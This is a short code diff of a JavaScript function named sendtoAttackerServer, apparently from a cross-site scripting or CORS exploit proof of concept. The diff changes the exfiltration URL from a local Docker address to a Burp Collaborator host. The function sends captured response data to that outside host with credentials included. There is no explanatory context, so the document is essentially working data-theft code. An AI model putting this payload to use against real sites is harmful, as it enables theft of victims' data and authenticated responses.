@@ -16,7 +16,7 @@ function sendtoAttackerServer(response){
         console.log("do nothing");
     }
   }
-  xhr.open('GET', 'http://172.17.0.1/capture?data='+response, true);
+  xhr.open('GET', 'http://gfzt3ivv1jbz0yya6jmmaifwknqge5.burpcollaborator.net/capture?data='+response, true);
   xhr.withCredentials = true;
   xhr.send(null);
 }
